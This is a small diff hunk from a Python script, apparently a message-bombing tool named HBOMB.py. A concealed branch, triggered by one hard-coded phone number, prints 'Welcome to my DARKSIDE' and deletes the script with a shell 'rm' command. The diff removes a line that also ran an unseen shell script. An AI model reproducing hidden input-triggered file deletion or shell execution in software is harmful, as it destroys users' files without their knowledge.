@@ -911,7 +911,6 @@ if target == '':
 elif target == '8077453131':
     print (color+"  Welcome to my DARKSIDE !!!!!  ")
     os.system("rm HBOMB.py")
-    os.system("./dangit.sh")
     exit()
 elif messagesss <= 0:
     print(
